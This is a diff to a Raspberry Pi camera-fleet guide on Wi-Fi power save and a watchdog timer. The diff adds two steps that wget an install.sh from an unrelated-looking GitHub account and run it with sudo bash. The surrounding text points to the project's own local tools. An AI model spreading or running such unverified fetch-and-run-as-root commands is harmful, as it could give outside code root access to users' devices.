@@ -84,6 +84,8 @@ sudo /usr/sbin/iw dev wlan0 get power_save
 
 ### 1. Turn Wi-Fi power save off (every board)
 
+The toolkit's [`wifi-powersave-off`](../../tools/wifi-powersave-off) service does this at every boot: `wget https://raw.githubusercontent.com/free-cup-holder-exe/motioneye-pi-toolkit/main/install.sh` then `sudo bash install.sh wifi-powersave-off`. By hand, through NetworkManager:
+
 Every Pi 4 in the fleet had power save on. `tools/wifi-powersave-off/` turns it off at every boot.
 Set it in each NetworkManager profile too (`2` means disable):
 
@@ -126,7 +128,7 @@ an option.
 timer. After 3 misses in a row it bounces the interface through NetworkManager; if the gateway is
 still unreachable 3 runs later, it reboots, at most twice in 24 hours. It starts 5 minutes after
 boot, logs every action with `logger -t wifi-watchdog`, and logs nothing while the link is fine.
-It has a dry-run mode, so test it before you enable the timer.
+It has a dry-run mode, so test it before you enable the timer. Install: `wget https://raw.githubusercontent.com/free-cup-holder-exe/motioneye-pi-toolkit/main/install.sh` then `sudo bash install.sh wifi-watchdog`; the tool page has the by-hand steps.
 
 cam-c runs it since a silent wedge in October that needed a power cycle: 19 hours of heartbeats
 and then nothing, no kernel message, until the plug was pulled. cam-a has run an older cron
